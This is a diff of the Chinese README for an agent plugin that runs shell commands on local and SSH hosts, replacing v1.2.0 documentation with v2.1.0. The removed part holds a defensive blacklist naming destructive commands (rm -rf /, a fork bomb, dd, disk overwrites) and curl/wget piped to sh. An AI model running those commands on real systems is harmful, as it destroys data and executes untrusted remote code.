@@ -1,721 +1,400 @@
-# LinuxShellExecutor v1.2.0
+# LinuxShellExecutor v2.1.0
 
-六层安全防护的 Linux Shell 命令执行器，专为 VCP Agent 设计。
+给 VCP Agent 提供本地 / 多机 Linux 命令执行、长任务后台脱钩与虚拟终端交互的 `hybridservice` 插件。
 
-## 🆕 v1.2.0 新功能 (配置回退与接口简化)
+- **多机并发**：`hostId` 使用逗号分隔字符串（如 `"local,nas,server"`），支持标签；单机故障不影响其余主机。
+- **统一回显**：命令执行、任务与终端结果统一收敛为 `<host> [status, meta]:` + 代码块，不再返回嵌套 JSON。
+- **超时脱钩**：命令超过同步等待阈值后自动转后台，不杀进程、不断 SSH 连接。
+- **虚拟终端**：按 `hostId::terminalId` 隔离 Channel，支持 Ctrl+C、stdin 注入与画面查看。
+- **安全管控**：黑名单 / 白名单 / 灰名单 / 特殊操作符 / AST / 审计统一接入执行入口。
 
-- ✅ **Host 配置回退机制** - 当全局 `SSHManager` 未找到目标主机时，自动回退至插件本地 `hosts.json` 查找，增强配置灵活性。
-- ✅ **listHosts 接口简化** - 移除冗余的状态探测逻辑，仅返回主机 ID、名称与 IP，大幅提升资产列表响应速度。
-- ✅ **架构健壮性提升** - 统一 `getHostConfig` 异步调用链路，确保配置加载过程中的 I/O 安全。
+## 快速开始
 
-## 📋 v1.1.9 功能 (连接策略优化)
+### 1. 安装依赖
 
-- ✅ **SSH 连接策略重构** - 默认采用“即用即连、完工即断”模式，彻底解决 VCP 多进程架构下的连接池失效与进程挂起问题。
-- ✅ **智能连接复用** - 仅在执行批量预设 (Presets) 命令时启用临时连接池。
-
-## 📋 v1.1.8 功能 (架构统一)
-
-- ✅ **SSHManager 架构重构 (v1.1.8)** - 将插件私有的 SSH 管理逻辑合并至系统共享模块 `modules/SSHManager` (v1.2.4)。
-- ✅ **共享单例模式** - 插件通过 `basePath` 注入方式复用系统级 SSH 连接管理器，确保与 `LinuxLogMonitor` 等插件共享连接池。
-- ✅ **主机锁与状态同步** - 继承了 v1.1.7 的 HostLock (PAM 保护) 和资产状态持久化功能。
-
-## 🆕 v1.1.7 新功能 (审计修复与加固)
-
-- ✅ **异步任务闭环 (v1.1.7)** - 修复 `isLongRunning` 识别逻辑，确保 `yum/apt/tail` 等指令真实进入托管流程而非同步阻塞。
-- ✅ **状态透传修复 (v1.1.7)** - 修正 `main()` 异步包装，确保 `Discovery` 资产引导状态能正确穿透至 Agent。
-- ✅ **安全层级重构 (v1.1.7)** - 调整校验顺序，支持 `DECRYPTED_AUTH_CODE` 匹配时强制逃逸白名单与安全等级限制。
-- ✅ **特殊操作符校验 (v1.1.7)** - 增强 `SecurityLevelValidator`，实现对 `;`, `&&`, `|` 等操作符的细粒度安全过滤。
-- ✅ **全局 OOM 防护 (v1.1.7)** - 在插件内置及共享 `SSHManager` 模块中引入输出长度硬限制，防止长日志导致内存溢出。
-
-## 🆕 v1.1.6 新功能 (PAM 锁定防御)
-
-- ✅ **SSH 认证锁定防御 (v1.1.6)** - 显式禁用 `keyboard-interactive` 探测，防止因并发连接触发服务器 PAM `pam_faillock` 导致账户锁定。
-- ✅ **主机级并发串行化 (v1.1.6)** - 引入 `Host-Level Serialization` 机制。在全局并发限制基础上，对单个主机的认证过程进行强制排队，彻底消除瞬时并发认证冲击风险。
-- ✅ **认证方法显式化 (v1.1.6)** - 优化 `ssh2` 配置，根据 `hosts.json` 显式指定 `key` 或 `password` 路径，跳过冗余的认证方法协商。
-
-## 🆕 v1.1.5 新功能
-
-- ✅ **全平台静默安装 (v1.1.5)** - 自动为 `apt`, `yum`, `pacman`, `yay`, `zypper`, `pip`, `npm` 等补全非交互参数（`-y`, `--noconfirm`）及 CI 环境变量。
-- ✅ **资源锁柔性修复 (v1.1.5)** - 内置 `_safeCleanupLocks` 逻辑，自动识别并安全修复包管理器死锁（如 `/var/lib/dpkg/lock`），规避 AI 执行 `rm` 指令受限的问题。
-- ✅ **异步任务托管强化** - 完善 `isLongRunning` 逻辑，支持真正的后台进程运行与日志重定向。
-- ✅ **交互阻塞探测** - 自动识别 `sudo` 密码、`[y/n]`、资源锁、选择提示符等交互特征，并及时返回 `interaction_required` 或 `background` 状态。
-- ✅ **跨插件接力引导** - 异步任务自动返回 `LinuxLogMonitor` 指令模板，引导 AI 进行全量进度追踪。
-
-## 📋 v1.1.0 功能
-
-- ✅ **授权码逃逸层** - 允许通过管理员授权码强制执行未定义（unknown）的命令。
-- ✅ **资产引导系统** - 当 `hostId` 缺失或不匹配时，主动返回 `status: "discovery"` 及可用资产列表。
-- ✅ **长待机指令支持** - 增加 `isLongRunning` 选项，将耗时任务（如安装、日志追踪）托管至后台并立即返回 `taskId`。
-- ✅ **主机列表接口** - `listHosts` 返回主机 ID、名称与地址（不主动探测连通性）。
-
-## 📋 v0.4.0 功能
-
-- ✅ **四级安全分级** - read/safe/write/danger 权限分级。
-- ✅ **智能管道验证** - 基于安全级别的管道链验证。
-- ✅ **预设诊断命令** - 12 个预设命令集（quickDiag, checkService 等）。
-- ✅ **输出格式化** - 自动截断、表格美化、多格式支持。
-
-## 📋 v1.1.5 AI 协作流程
-
-1. **执行长时任务**: 建议设置 `isLongRunning: true`。插件会返回 `taskId`，AI 随后应引导用户使用 `LinuxLogMonitor` 插件进行日志追踪。
-2. **处理资源锁**: 若返回 `interaction_required` 且 `blockType` 为 `resource_locked`，AI 应主动调用 `_safeCleanupLocks` 进行修复。
-3. **静默化原则**: 插件已内置 `_patchCommandForNonInteractive`，AI 无需在命令中手动拼接 `-y`。
-
-## 📋 v1.1.0 迭代功能
-
-- ✅ **授权码逃逸** - 允许通过管理员授权码强制执行未定义命令。
-- ✅ **资产引导** - `hostId` 错误时自动返回可用资产列表。
-- ✅ **长待机托管** - 支持 `isLongRunning` 参数，自动托管耗时任务。
-- ✅ **主机列表** - `listHosts` 返回主机基础信息（不做连通性过滤）。
-
-## 📋 v0.3.x 功能
-
-- ✅ **三级权限控制** - 白名单（免验证）/ 灰名单（需验证）/ 黑名单（禁止）
-- ✅ **资源限制 (rlimit)** - 支持 CPU、内存、文件大小、进程数等资源限制
-- ✅ **管道命令验证** - 支持管道命令的安全验证，限制管道深度和允许的命令
-- ✅ **SSH 连接池优化** - 连接数量限制、自动重试、连接池大小管理
-
-## 📋 v0.2.0 功能
-
-- ✅ **多主机 SSH 远程执行** - 支持配置多台 Linux 服务器
-- ✅ **密钥/密码认证** - 支持 SSH 私钥和密码两种认证方式
-- ✅ **跳板机支持** - 支持通过跳板机访问内网服务器
-- ✅ **连接池管理** - 自动管理 SSH 连接，支持会话复用
-
-## 架构概览
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    LinuxShellExecutor v0.4.0                │
-├─────────────────────────────────────────────────────────────┤
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │                   主机管理器                         │   │
-│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐             │   │
-│  │  │ local   │  │dev-server│ │prod-srv │  ...        │   │
-│  │  │ 本地    │  │ SSH Key │  │ SSH Key │             │   │
-│  │  └─────────┘  └─────────┘  └─────────┘             │   │
-│  └─────────────────────────────────────────────────────┘   │
-│                          ↓                                  │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │              三级权限控制                            │   │
-│  │  ┌─────────┐    ┌─────────┐             │   │
-│  │  │ 黑名单  │→│ 白名单  │→│ 灰名单  │             │   │
-│  │  │ 禁止    │  │ 免验证  │  │ 需验证  │             │   │
-│  │  └─────────┘  └─────────┘  └─────────┘             │   │
-│  └─────────────────────────────────────────────────────┘   │
-│                          ↓                                  │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │              六层安全防护                            │   │
-│  │  1.黑名单 → 2.白名单 → 3.灰名单 → 4.AST → 5.沙箱 → 6.审计│   │
-│  └─────────────────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────────────────┘
-```
-
-## 安装依赖
+在项目根目录执行：
 
 ```bash
-cd Plugin/LinuxShellExecutor
 npm install ssh2 dotenv
 ```
 
-## 系统依赖（本地沙箱执行）
+本地交互终端优先使用 util-linux 的 `script` 创建 PTY；缺失时回退到 `bash -i` + 信号模拟。
 
-```bash
-# Bubblewrap（推荐，最轻量）
-apt install bubblewrap
+### 2. 配置主机
 
-# 或 Firejail
-apt install firejail
-
-# 或 Docker
-apt install docker.io
-```
-
-## 配置说明
-
-### 1. 主机配置 (hosts.json)
+编辑 `Plugin/LinuxShellExecutor/hosts.json`：
 
 ```json
 {
-    "hosts": {
-        "local": {
-            "name": "本地执行",
-            "type": "local",
-            "enabled": true,
-            "securityLevel": "standard"
-        },
-        "dev-server": {
-            "name": "开发服务器",
-            "type": "ssh",
-            "enabled": true,
-            "host": "192.168.1.100",
-            "port": 22,
-            "username": "developer",
-            "authMethod": "key",
-            "privateKeyPath": "~/.ssh/id_rsa",
-            "securityLevel": "standard"
-        },
-        "prod-server": {
-            "name": "生产服务器",
-            "type": "ssh",
-            "enabled": true,
-            "host": "10.0.0.10",
-            "port": 22,
-            "username": "ops",
-            "authMethod": "key",
-            "privateKeyPath": "/path/to/prod_key",
-            "securityLevel": "high",
-            "jumpHost": "bastion"
-        }
+  "hosts": {
+    "local": {
+      "name": "本地执行",
+      "type": "local",
+      "enabled": true
     },
-    "defaultHost": "local",
-    "globalSettings": {
-        "maxConcurrentConnections": 5,
-        "connectionPoolSize": 10,
-        "defaultTimeout": 30000,
-        "retryAttempts": 3,
-        "retryDelay": 1000,
-        "logConnections": true
+    "dev": {
+      "name": "开发机",
+      "type": "ssh",
+      "enabled": true,
+      "host": "192.168.1.100",
+      "port": 22,
+      "username": "dev",
+      "authMethod": "key",
+      "privateKeyPath": "~/.ssh/id_rsa",
+      "tags": ["dev", "linux"]
     }
+  },
+  "defaultHost": "local"
 }
 ```
 
-### hosts.json 字段说明
+> `hosts.json` 仍是仓库默认模板时（MD5 匹配），插件只启用 `local`，不会连接任何远程主机。写入真实主机并重启插件/服务后生效。
 
-#### 主机配置字段 (hosts.{hostId})
+私钥路径支持绝对路径、`~` 展开，或相对于 `Plugin/LinuxShellExecutor/` 的相对路径。
 
-| 字段 | 类型 | 必需 | 默认值 | 说明 |
-|------|------|------|--------|------|
-| `name` | string | ✓ | - | 主机显示名称 |
-| `description` | string | | - | 主机描述信息 |
-| `type` | string | ✓ | - | 主机类型：`local`（本地）或 `ssh`（远程） |
-| `enabled` | boolean | ✓ | - | 是否启用该主机 |
-| `host` | string | SSH必需 | - | SSH 主机地址（IP 或域名） |
-| `port` | number | | 22 | SSH 端口号 |
-| `username` | string | SSH必需 | - | SSH 登录用户名 |
-| `authMethod` | string | SSH必需 | - | 认证方式：`key`（密钥）或 `password`（密码） |
-| `privateKeyPath` | string | 密钥认证必需 | - | SSH 私钥文件路径，支持 `~` 展开 |
-| `passphrase` | string | | "" | 私钥密码短语（如果私钥有密码保护） |
-| `password` | string | 密码认证必需 | - | SSH 登录密码（不推荐使用） |
-| `securityLevel` | string | | "standard" | 安全等级：`basic`/`standard`/`high`/`maximum` |
-| `timeout` | number | | 30000 | 连接超时时间（毫秒） |
-| `keepAliveInterval` | number | | 10000 | 心跳保活间隔（毫秒） |
-| `jumpHost` | string | | null | 跳板机主机ID（用于访问内网服务器） |
-| `tags` | array | | [] | 主机标签，用于分类和筛选 |
+### 3. 调用
 
-#### 全局配置字段 (globalSettings)
-
-| 字段 | 类型 | 默认值 | 说明 |
-|------|------|--------|------|
-| `maxConcurrentConnections` | number | 5 | 最大并发连接数 |
-| `connectionPoolSize` | number | 10 | 连接池大小 |
-| `defaultTimeout` | number | 30000 | 默认超时时间（毫秒） |
-| `retryAttempts` | number | 3 | 连接失败重试次数 |
-| `retryDelay` | number | 1000 | 重试间隔（毫秒） |
-| `logConnections` | boolean | true | 是否记录连接日志 |
-
-#### 顶层配置字段
-
-| 字段 | 类型 | 说明 |
-|------|------|------|
-| `version` | string | 配置文件版本号 |
-| `description` | string | 配置文件描述 |
-| `hosts` | object | 主机配置对象，key 为主机ID |
-| `defaultHost` | string | 默认主机ID，未指定 hostId 时使用 |
-| `globalSettings` | object | 全局设置 |
-
-### 2. 认证方式
-
-#### SSH 密钥认证（推荐）
-
-```json
-{
-    "authMethod": "key",
-    "privateKeyPath": "~/.ssh/id_rsa",
-    "passphrase": ""
-}
-```
-
-#### 密码认证（不推荐）
-
-```json
-{
-    "authMethod": "password",
-    "password": "your-password"
-}
-```
-
-### 3. 跳板机配置
-
-```json
-{
-    "bastion": {
-        "name": "跳板机",
-        "type": "ssh",
-        "host": "bastion.example.com",
-        "username": "jump",
-        "authMethod": "key",
-        "privateKeyPath": "~/.ssh/bastion_key"
-    },
-    "internal-server": {
-        "name": "内网服务器",
-        "type": "ssh",
-        "host": "192.168.100.50",
-        "username": "admin",
-        "authMethod": "key",
-        "privateKeyPath": "~/.ssh/internal_key",
-        "jumpHost": "bastion"
-    }
-}
-```
-
-## 调用方式
-
-### 基本命令执行
-
-```
+```text
 <<<[TOOL_REQUEST]>>>
 tool_name:「始」LinuxShellExecutor「末」,
-command:「始」ls -la /tmp「末」
+command:「始」uname -srm「末」,
+hostId:「始」local「末」
 <<<[END_TOOL_REQUEST]>>>
 ```
 
-### 指定远程主机
+## 工具参数
 
-```
-<<<[TOOL_REQUEST]>>>
-tool_name:「始」LinuxShellExecutor「末」,
-command:「始」df -h「末」,
-hostId:「始」dev-server「末」
-<<<[END_TOOL_REQUEST]>>>
-```
+| 参数 | 类型 | 说明 |
+| :--- | :--- | :--- |
+| `command` | string | 要执行的命令，或 `preset:预设名?参数`。执行类 Action 必需 |
+| `hostId` | string | 逗号分隔的主机 ID，如 `"local,nas,server"`；也支持 `@tag` / `tag:xxx`；默认 `defaultHost` |
+| `terminalId` | string | 虚拟终端 ID。显式指定时命令在持久终端中前台运行 |
+| `timeout` | number | 同步等待阈值（ms），默认 `30000`，最大 `55000` |
+| `isLongRunning` | boolean | `true` 时立即转后台脱钩，不进行同步等待 |
+| `interactive` | boolean | 显式 `terminalId` 时是否启用交互终端，默认 `true` |
+| `forceNewChannel` | boolean | 强制派生新的子终端 Channel |
+| `securityLevel` | string | `basic` / `standard` / `high` / `maximum`；默认取主机配置或 `DEFAULT_SECURITY_LEVEL` |
+| `requireAdmin` | string | 管理员验证码（6位），用于灰名单与未知命令授权 |
+| `doubleConfirm` | boolean | critical 灰名单 / 高危预设的二次确认标志 |
+| `outputFormat` | string | 兼容旧参数；v2.0 统一输出 Markdown |
+| `taskId` | string | `queryTask` / `cancelTask` / `queryVisible` 使用 |
+| `lines` | number | `queryTask` 默认 50 行，`queryVisible` 默认 20 行 |
+| `key` | string | `sendKey` 的按键名，如 `ctrl+c` |
+| `repeat` | number | `sendKey` 重复次数，默认 1，最大 50 |
+| `text` | string | `pasteText` 要写入 stdin 的文本 |
+| `submit` | boolean | `pasteText` 是否追加回车，默认 `true` |
+| `status` | string | `listTasks` 状态过滤，可逗号分隔 |
+| `limit` | number | `listTasks` 返回数量，默认 20 |
+| `startDelayMs` | number | `runInTerminal` 启动后返回的等待时间，默认 500 |
 
-### 列出所有主机
+## Actions
 
-```
-<<<[TOOL_REQUEST]>>>
-tool_name:「始」LinuxShellExecutor「末」,
-action:「始」listHosts「末」
-<<<[END_TOOL_REQUEST]>>>
-```
+| Action | 关键参数 | 说明 |
+| :--- | :--- | :--- |
+| 默认 / `execute` | `command`, `hostId` | 执行命令；显式 `terminalId` 时进入交互终端 |
+| `runInTerminal` | `command`, `terminalId` | 在虚拟终端启动命令，通常返回 `running` |
+| `queryTask` | `taskId`, `lines` | 查询脱钩任务状态与尾部日志 |
+| `listTasks` | `hostId`, `status`, `limit` | 列出登记任务 |
+| `cancelTask` | `taskId` | 终止进程树并清理哨兵文件 |
+| `sendKey` / `sendInteractiveKey` | `terminalId`, `key`, `repeat` | 注入控制键 |
+| `pasteText` / `pasteInteractiveText` | `terminalId`, `text`, `submit` | 向 stdin 写入文本 |
+| `queryVisible` | `terminalId` 或 `taskId`, `lines` | 查看终端画面 / 任务日志尾部 |
+| `listTerminals` | — | 列出活跃虚拟终端 |
+| `listHosts` | — | 列出主机 |
+| `testConnection` | `hostId` | 测试主机连接 |
+| `getStatus` | — | 连接状态 |
+| `listPresets` | — | 预设命令列表 |
 
-### 测试主机连接
+`sendKey` 支持：`ctrl+c`、`ctrl+d`、`ctrl+z`、`ctrl+l`、`ctrl+u`、`enter`、`esc`、`tab`、`up`、`down`、`left`、`right`、`home`、`end`、`pageup`、`pagedown`、`backspace`、`space`。
 
-```
-<<<[TOOL_REQUEST]>>>
-tool_name:「始」LinuxShellExecutor「末」,
-action:「始」testConnection「末」,
-hostId:「始」dev-server「末」
-<<<[END_TOOL_REQUEST]>>>
-```
+## 使用示例
 
-### 获取连接状态
+### 本地执行
 
-```
-<<<[TOOL_REQUEST]>>>
-tool_name:「始」LinuxShellExecutor「末」,
-action:「始」getStatus「末」
-<<<[END_TOOL_REQUEST]>>>
-```
-
-## 参数说明
-
-| 参数 | 类型 | 必需 | 说明 |
-|------|------|------|------|
-| `command` | string | ✓* | 要执行的 Shell 命令，或 `preset:预设名?参数` 格式 |
-| `action` | string | ✓* | 特殊操作：listHosts/testConnection/getStatus/listPresets |
-| `hostId` | string | | 目标主机ID，默认 'local' |
-| `isLongRunning` | boolean | | 是否为长待机指令（设为 true 后任务转入后台） |
-| `authCode` | string | | 管理员授权码，用于强制执行 unknown 命令 |
-| `timeout` | number | | 超时时间（毫秒），默认 30000 |
-| `outputFormat` | string | | 输出格式：raw/formatted/json，默认 'formatted' |
-| `requireAdmin` | string | 条件必需 | 管理员验证码，write/danger 级别命令必需 |
-
-*注：command 和 action 二选一
-
-## 返回格式
-
-### 命令执行成功
-
-```json
+```javascript
 {
-    "status": "success",
-    "result": "命令输出内容",
-    "stderr": "错误输出（如有）",
-    "code": 0,
-    "duration": 123,
-    "hostId": "dev-server",
-    "securityLevel": "standard",
-    "executionType": "ssh"
+  command: "df -h && free -h",
+  hostId: "local"
 }
 ```
 
-### 列出主机
+### 多机并发
 
-```json
+```javascript
 {
-    "status": "success",
-    "hosts": [
-        {
-            "id": "local",
-            "name": "本地执行",
-            "host": "localhost"
-        },
-        {
-            "id": "dev-server",
-            "name": "开发服务器",
-            "host": "192.168.1.100"
-        }
-    ]
+  command: "uname -srm",
+  hostId: "local,nas,server"    // 只支持逗号分隔字符串；数组形式已移除
 }
 ```
 
-### 连接测试
+单台主机不可达时只返回该主机的 `[error]` 块，其余主机正常输出。
 
-```json
+### 标签批量执行
+
+```javascript
 {
-    "status": "success",
-    "success": true,
-    "hostId": "dev-server",
-    "latency": 45,
-    "message": "连接成功，延迟 45ms"
+  command: "uptime",
+  hostId: "@linux"              // 或 "tag:linux"
 }
 ```
 
-## 安全等级
+### 长任务脱钩与查询
 
-| 等级 | 启用层 | 适用场景 |
-|------|--------|----------|
-| `basic` | 黑名单 | 内部可信环境 |
-| `standard` | 黑名单 + 白名单/灰名单 + 沙箱 | 一般生产环境（默认） |
-| `high` | 黑名单 + 白名单/灰名单 + AST + 沙箱 | 敏感数据环境 |
-| `maximum` | 全部六层 | 公开 API / 多租户 |
+```javascript
+// 1. 超过 3 秒仍未结束 -> 返回 detached + taskId
+{
+  command: "for i in $(seq 1 8); do echo tick_$i; sleep 1; done",
+  hostId: "local",
+  timeout: 3000
+}
 
-## 白名单命令列表（无需验证）
+// 2. 查询进度
+{ action: "queryTask", taskId: "task_local_...", lines: 20 }
 
-| 命令 | 说明 | 允许的参数 |
-|------|------|-----------|
-| `ls` | 列出目录 | -l, -a, -la, -lh, -R, -t, -S |
-| `cat` | 查看文件 | -n, -b, -s |
-| `grep` | 文本搜索 | -i, -n, -r, -v, -c, -l, -E, -w |
-| `find` | 查找文件 | -name, -type, -size, -mtime, -maxdepth |
-| `ps` | 查看进程 | aux, -ef, -u, --forest |
-| `df` | 磁盘使用 | -h, -T, -i |
-| `free` | 内存使用 | -m, -h, -g |
-| `head` | 文件头部 | -n, -c |
-| `tail` | 文件尾部 | -n, -f, -c |
-| `wc` | 统计 | -l, -w, -c, -m |
-| `echo` | 输出文本 | -n, -e |
-| `pwd` | 当前目录 | - |
-| `whoami` | 当前用户 | - |
-| `date` | 日期时间 | +%Y-%m-%d, +%H:%M:%S |
-| `uname` | 系统信息 | -a, -r, -m, -n |
-| `hostname` | 主机名 | -f, -i |
-| `uptime` | 运行时间 | -p, -s |
-| `id` | 用户ID | -u, -g, -n |
-| `env` | 环境变量 | - |
-| `which` | 命令路径 | -a |
-| `file` | 文件类型 | -b, -i |
-| `stat` | 文件状态 | -c |
-| `du` | 目录大小 | -h, -s, -a, -c |
-| `sort` | 排序 | -n, -r, -u, -k, -t |
-| `uniq` | 去重 | -c, -d, -u |
-| `cut` | 字段切割 | -d, -f, -c |
-| `awk` | 文本处理 | -F |
-| `sed` | 流编辑器 | -n, -e |
+// 3. 主动取消
+{ action: "cancelTask", taskId: "task_local_..." }
+```
 
-## 灰名单命令列表（需要验证）
+### 交互终端：Ctrl+C 中断
 
-### 系统状态监控
+```javascript
+// 1. 在指定终端启动阻塞命令
+{
+  action: "runInTerminal",
+  command: "ping 127.0.0.1",
+  hostId: "local",
+  terminalId: "debug-term"
+}
 
-| 命令 | 说明 | 风险级别 |
-|------|------|----------|
-| `uptime` | 系统运行时间 | 🟢 低 |
-| `free` | 内存使用情况（扩展参数） | 🟢 低 |
-| `top` | 系统监控（扩展迭代） | 🟢 低 |
-| `htop` | 交互式进程监控 | 🟡 中 |
-| `vmstat` | 虚拟内存统计（扩展） | 🟢 低 |
-| `iostat` | IO 统计（扩展） | 🟢 低 |
+// 2. 查看当前画面
+{ action: "queryVisible", hostId: "local", terminalId: "debug-term", lines: 20 }
 
-### 网络诊断
+// 3. 注入 Ctrl+C
+{ action: "sendKey", hostId: "local", terminalId: "debug-term", key: "ctrl+c" }
 
-| 命令 | 说明 | 风险级别 |
-|------|------|----------|
-| `ip` | 网络配置查看 | 🟢 低 |
-| `ss` | Socket 统计（扩展） | 🟢 低 |
-| `ping` | 网络连通性测试（扩展） | 🟢 低 |
-| `traceroute` | 路由追踪 | 🟢 低 |
-| `mtr` | 网络诊断 | 🟢 低 |
-| `curl` | HTTP 请求（完整功能） | 🟡 中 |
-| `wget` | HTTP 下载 | 🟡 中 |
-| `nc/netcat` | 网络调试工具 | 🟡 中 |
-| `tcpdump` | 网络抓包 | 🔴 高 |
+// 4. 再次查看，确认进程已退出
+{ action: "queryVisible", hostId: "local", terminalId: "debug-term", lines: 20 }
+```
 
-### 进程管理
+### 交互终端：写入 stdin
 
-| 命令 | 说明 | 风险级别 |
-|------|------|----------|
-| `pgrep` | 按名称查找进程 | 🟢 低 |
-| `lsof` | 列出打开的文件/端口 | 🟢 低 |
-| `kill` | 终止进程 | 🔴 高 |
-| `killall` | 按名称终止进程 | 🔴 高 |
-| `pkill` | 按模式终止进程 | 🔴 高 |
+```javascript
+// 命令等待输入
+{
+  action: "runInTerminal",
+  command: "read -p \"Confirm? [y/N]: \" ans; echo \"ANSWER=$ans\"",
+  hostId: "local",
+  terminalId: "input-term"
+}
 
-### 日志查看
+// 写入 y 并回车
+{
+  action: "pasteText",
+  hostId: "local",
+  terminalId: "input-term",
+  text: "y",
+  submit: true
+}
+```
 
-| 命令 | 说明 | 风险级别 |
-|------|------|----------|
-| `tail` | 实时日志追踪（-f 模式） | 🟡 中 |
-| `journalctl` | 系统日志查询（扩展） | 🟡 中 |
-| `dmesg` | 内核日志（扩展） | 🟡 中 |
+### 预设命令
 
-### 服务管理
+调用格式：
 
-| 命令 | 说明 | 风险级别 |
-|------|------|----------|
-| `systemctl` | 服务管理（完整控制） | 🔴 高 |
-| `service` | 服务管理（传统命令） | 🔴 高 |
+```text
+command:「始」preset:<预设名>「末」
+command:「始」preset:checkService?serviceName=nginx&logLines=100「末」
+```
 
-### Docker 容器
+当前内置 17 个预设：
 
-| 命令 | 说明 | 风险级别 |
-|------|------|----------|
-| `docker` | Docker 完整管理 | 🔴 高 |
-| `docker-compose` | Docker Compose 管理 | 🔴 高 |
+| 预设 | 说明 | 参数 |
+| :--- | :--- | :--- |
+| `quickDiag` | 快速系统诊断 | — |
+| `checkMemory` | 内存占用、Swap、Top 内存进程 | — |
+| `checkCpu` | CPU 信息、平均负载、Top CPU 进程 | — |
+| `checkDisk` | 磁盘详细检查 | — |
+| `checkDiskUsage` | 分区 / inode / 常见目录占用速查 | — |
+| `checkPerformance` | CPU / 内存 / IO 性能分析 | `interval`, `count` |
+| `checkPorts` | 监听端口与 Established 连接 | — |
+| `checkProcesses` | 进程总数、Top CPU/内存、僵尸进程 | — |
+| `checkService` | 服务状态与最近日志 | `serviceName`, `logLines` |
+| `netDiag` | 网络连接与端口诊断 | — |
+| `checkDocker` | Docker 容器 / 镜像状态 | `containerName` |
+| `checkLogs` | 系统与应用日志 | `logFile`, `lines`, `keyword` |
+| `checkSecurity` | 登录记录与安全检查 | — |
+| `checkMysql` | MySQL 状态 | `host`, `user` |
+| `checkRedis` | Redis 状态 | `host`, `port` |
+| `checkNginx` | Nginx 状态 | — |
+| `pingTest` | 网络连通性测试 | `target`, `count` |
 
-### 数据库管理
+> 预设命令由管理员在 `presets.json` 中维护，属于可信模板：执行时跳过黑/白/灰名单、特殊操作符与 AST 文本检查，仅保留提权前置拦截、预设 `securityLevel` 验证与审计。
 
-| 命令 | 说明 | 风险级别 |
-|------|------|----------|
-| `mysql` | MySQL 管理（扩展） | 🔴 高 |
-| `mysqladmin` | MySQL 管理工具 | 🟡 中 |
-| `redis-cli` | Redis 管理（扩展） | 🔴 高 |
-| `psql` | PostgreSQL 客户端 | 🔴 高 |
-| `mongo` | MongoDB 客户端 | 🔴 高 |
+```javascript
+{ command: "preset:quickDiag", hostId: "local" }
+{ command: "preset:checkService?serviceName=nginx&logLines=100" }
+{ action: "listPresets" }
+```
 
-### 系统控制
+### 灰名单与未知命令授权
 
-| 命令 | 说明 | 风险级别 |
-|------|------|----------|
-| `nginx` | Nginx 管理 | 🔴 高 |
-| `apachectl` | Apache 管理 | 🔴 高 |
-| `crontab` | 定时任务查看 | 🟡 中 |
-| `timedatectl` | 时间日期管理 | 🟡 中 |
-| `reboot` | 重启系统 | ⚫ 极高 |
-| `shutdown` | 关机/重启 | ⚫ 极高 |
+```javascript
+// 灰名单：需要管理员验证码；critical 风险还需 doubleConfirm
+{
+  command: "systemctl restart nginx",
+  hostId: "local",
+  requireAdmin: "123456"
+}
 
-## 黑名单命令列表（完全禁止）
+// 不在任何名单中的命令：有效验证码可授权执行
+{
+  command: "custom-tool --flag",
+  hostId: "local",
+  requireAdmin: "123456"
+}
+```
 
-黑名单配置在 `config.env` 文件中，分为两类：
+## 输出格式
 
-### 禁止模式（正则匹配）
+统一格式：
 
-| 模式 | 说明 | 危险等级 |
-|------|------|----------|
-| `rm -rf /` | 删除根目录 | ⚫ 致命 |
-| `rm -rf /*` | 删除根目录所有内容 | ⚫ 致命 |
-| `mkfs.*` | 格式化文件系统 | ⚫ 致命 |
-| `dd if=` | 磁盘镜像写入 | ⚫ 致命 |
-| `:(){ :\|:& };:` | Fork 炸弹 | ⚫ 致命 |
-| `chmod 777 /` | 修改根目录权限 | 🔴 高危 |
-| `chmod -R 777` | 递归修改权限 | 🔴 高危 |
-| `> /dev/sd*` | 写入磁盘设备 | ⚫ 致命 |
-| `cat /dev/zero > /dev/sd*` | 清空磁盘 | ⚫ 致命 |
-| `wget ... \| sh` | 远程脚本执行 | 🔴 高危 |
-| `curl ... \| sh` | 远程脚本执行 | 🔴 高危 |
+````text
+<hostId> [status, meta]:
+```
+输出内容
+```
+````
 
-### 禁止命令（精确匹配）
+常见 meta：
 
-| 命令 | 说明 | 危险等级 |
-|------|------|----------|
-| `poweroff` | 关机 | 🔴 高危 |
-| `halt` | 停机 | 🔴 高危 |
-| `init 0` | 关机 | 🔴 高危 |
-| `init 6` | 重启 | 🔴 高危 |
-| `reboot -f` | 强制重启 | 🔴 高危 |
-| `shutdown` | 关机/重启 | 🔴 高危 |
+| 场景 | 输出 |
+| :--- | :--- |
+| 正常完成 | `<local> [exit: 0, 45ms]:` |
+| 超时脱钩 | `<local> [detached, taskId: task_local_...]:` |
+| 任务运行中 | `<local> [running, taskId: task_local_..., elapsed: 5200ms]:` |
+| 交互终端运行中 | `<local> [running, terminalId: debug-term, elapsed: 800ms]:` |
+| 查询已完成任务 | `<local> [completed, exit: 0, totalDuration: 8027ms]:` |
+| 按键注入 | `<local> [signal: SIGINT, terminalId: debug-term, 8ms]:` |
+| stdin 注入 | `<local> [stdin_injected, terminalId: debug-term, 5ms]:` |
+| 终端画面 | `<local> [visible_buffer, terminalId: debug-term]:` |
+| 错误 | `<local> [error, 25ms]:` |
 
-> **注意**: 黑名单命令无论是否提供验证码都会被拒绝执行。
+工具返回同时包含 `content: [{ type: "text", text }]`，AI 侧直接读取 Markdown 文本。
 
-## 安全检测示例
+> 管理类 Action（`listHosts` / `testConnection` / `getStatus` / `listPresets`）返回结构化对象，不使用上述主机块格式。
 
-### 被拦截的危险命令
+## 任务哨兵
+
+脱钩任务在目标机写入三个文件：
+
+| 文件 | 用途 |
+| :--- | :--- |
+| `/tmp/vcp_{taskId}.log` | 持续输出，可 tail |
+| `/tmp/vcp_{taskId}.json` | 原子回执，包含 `exit` 与 `ts` |
+| `/tmp/vcp_{taskId}.pid` | 后台进程 PID，`cancelTask` 使用 |
+
+任务元数据持久化在 `Plugin/LinuxShellExecutor/state/tasks.json`，进程重启后仍可用 `queryTask` 查询。主进程每 3 秒静默巡检一次，任务完成或 30 分钟后自动停止巡检。
+
+> 不再需要 `LinuxLogMonitor` 插件。
+
+## 虚拟终端
+
